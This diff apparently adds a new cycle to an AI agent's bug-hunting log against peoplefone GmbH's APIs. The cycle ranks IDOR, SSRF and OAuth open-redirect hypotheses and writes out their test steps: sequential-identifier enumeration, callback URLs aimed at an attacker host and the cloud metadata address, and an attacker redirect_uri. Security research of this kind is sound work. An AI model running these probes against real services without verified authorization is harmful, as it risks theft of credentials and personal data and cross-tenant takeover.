@@ -1390,3 +1390,45 @@ testability: HUMAN_ONLY
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains all NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no alternative surface.
 [LEARN] ACCEPTED OTH @ inventory: call-api.peoplefone.com/services/api-doc/ 404 reconfirmed (2026-09-07);
 [RISK] peoplefone GmbH: **82/100** — Sole report-ready finding (OAuth open-redirect/login-CSRF, 00:30 triage VALID 7.4/9.1) still unconfirmed submitted at bugs.olivermaicher.eu (valid-bugs count 0) after 21 frozen cycles. Silent-ATO branch falsified for known clients (confidential secret required); guaranteed impact narrowed to open-redirect+login-CSRF with implicit-flow ATO as HUMAN_ONLY. Configuration IDOR (85) + SSRF (78) remain live behind one bearer token unacquirable agent-side (register 500 persists; 00:30 triage HOLDS both pending token). Entire backlog gated on (a) human report submission and (b) human token acquisition via register recovery — no agent-side action moves risk beyond passive passthrough. Risk drops only on confirmed submission with a valid-bugs increment.
+## 2026-09-08 13:25:26 UTC [target] (model bigpickle)
+[PRIO] configuration-api.peoplefone.com/customer/voip/v1/{resource}/{identifier},9,9,7,2,6,8,8.3 — unchanged from 21 prior cycles
+[PRIO] 5 SSRF callback endpoints,8,9,6,2,6,8,7.4 — unchanged, token-gated
+[PRIO] auth.peoplefone.com/oauth/authorize,5,7,9,2,6,8,6.6 — open-redirect/login-CSRF confirmed but HUMAN_ONLY for ATO escalation
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential identifiers; spec says "user must be part of account bound to bearer token" but enforcement unproven; UserResponse exposes sipUserName+email+physical address; live 401 gate confirmed; cross-model convergence; no counter-evidence across 22 frozen cycles; 00:30 triage holds at HOLD pending bearer token
+evidence_needed: tenant-A bearer returns tenant-B {identifier} object via ±1 enumeration
+verify_steps: (authorized, read-only) GET /customer/voip/v1/users, /users/{own_id}, /users/{own_id±1}; repeat /numbers/{did}, /callforwarding/{id}; compare tenant markers
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1 sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri no enum/allowlist across 5 endpoints; External Number Lookup forwards Authorization/X-API-Key to attacker URL; deprecated External Routing (2026-09-30) repeats pattern on weaker path; no counter-evidence across 22 frozen cycles; 00:30 triage holds at HOLD pending bearer token
+evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254/latest/meta-data/; inspect attacker-side receipt only
+impact: metadata/IAM theft, internal SIP/PBX pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
+[HYP] OAuth arbitrary redirect_uri / open-redirect + login-CSRF on auth (client_id=1)
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: authorize 302→/de_CH/login preserves arbitrary redirect_uri for client_id=1 with implicit+PKCE accepted (warm session); stateless authorize 404 but sets redirect_uri cookie with attacker value (freshly re-verified this cycle); token endpoint enforces client-secret (401 invalid_client for clients 1/4/5; nonexistent → 500); code-theft-exchange ATO falsified for known clients; guaranteed primitive = open-redirect+login-CSRF; ATO only via HUMAN_ONLY warm-session implicit-flow; 00:30 triage VALID 7.4 (9.1 conditional), sole report-ready item
+evidence_needed: warm-session authorize response_type=token + attacker redirect_uri yields access_token fragment at attacker; else open-redirect+login-CSRF stands
+verify_steps: (authorized, human) warm portal session; authorize?client_id=1&response_type=token&redirect_uri=attacker; observe fragment; else submit as open-redirect+login-CSRF
+impact: silent ATO of portal users (recordings, CDR, PBX, billing, PII) if implicit; else open-redirect+login-CSRF; CRITICAL conditional
+testability: HUMAN_ONLY
+[PARKED] BUSLOGIC Queue agent login/logout: triage-formal INVALID (spec-silent on membership validation); dropped 7+ cycles, no revival without new spec evidence.
+[FINAL] 1. Configuration API {identifier} CRUD IDOR — 85, AUTH_HELPED, CRITICAL — RETAIN top slot, frozen 22 cycles, token-gated (triage HOLD).
+[FINAL] 2. SSRF 5 callback endpoints incl. header exfil — 78, AUTH_HELPED, CRITICAL — RETAIN, token-gated (triage HOLD).
+[FINAL] 3. OAuth open-redirect/login-CSRF — 62, HUMAN_ONLY, CRITICAL-conditional — RETAIN; sole report-ready item (00:30 triage VALID 7.4/9.1); do not claim silent ATO as guaranteed.
+[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu now — 00:30 triage VALID 7.4 (9.1 conditional). Payload ready: arbitrary redirect_uri preserved 302→/de_CH/login for client_id=1 (warm portal session), implicit+PKCE accepted, redirect_uri cookie set even on stateless 404 (freshly re-verified this cycle). Present guaranteed impact as open-redirect+login-CSRF; frame warm-session implicit-flow fragment test as potential silent-ATO escalation, NOT confirmed. Do NOT gate on client-type proof. Separately: when register exits 500, create a genuine portal account → mint bearer → run IDOR verify_steps `/customer/voip/v1/users ±1` (read-only). Agent-side exhausted: register 500 held across 22 cycles and full inventory breadth closed — no probe adds signal.
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: register 500 / token 401 known-clients & 500 nonexistent / stateless authorize 404+attacker redirect_uri cookie (freshly re-verified) / api-doc 200 — NO_DELTA re-verified; 22nd frozen cycle; 00:30 triage VALID on the open-redirect/login-CSRF primitive; consistent with prior triage.
+[LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (22nd frozen cycle); triage HOLD pending bearer token.
+[LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (22nd frozen cycle); triage HOLD.
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains all NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no alternative surface.
+[LEARN] ACCEPTED OTH @ inventory: call-api.peoplefone.com/services/api-doc/ 404 reconfirmed (2026-09-07); config-api docs 404 reconfirmed this cycle.
+[RISK] peoplefone GmbH: **82/100** — Sole report-ready finding (OAuth open-redirect/login-CSRF, 00:30 triage VALID 7.4/9.1) still unconfirmed submitted at bugs.olivermaicher.eu (valid-bugs count 0) after 22 frozen cycles. Silent-ATO branch falsified for known clients (confidential secret required); guaranteed impact narrowed to open-redirect+login-CSRF with implicit-flow ATO as HUMAN_ONLY. Configuration IDOR (85) + SSRF (78) remain live behind one bearer token unacquirable agent-side (register 500 persists; 00:30 triage HOLDS both pending token). Entire backlog gated on (a) human report submission and (b) human token acquisition via register recovery — no agent-side action moves risk beyond passive passthrough. Risk drops only on confirmed submission with a valid-bugs increment.
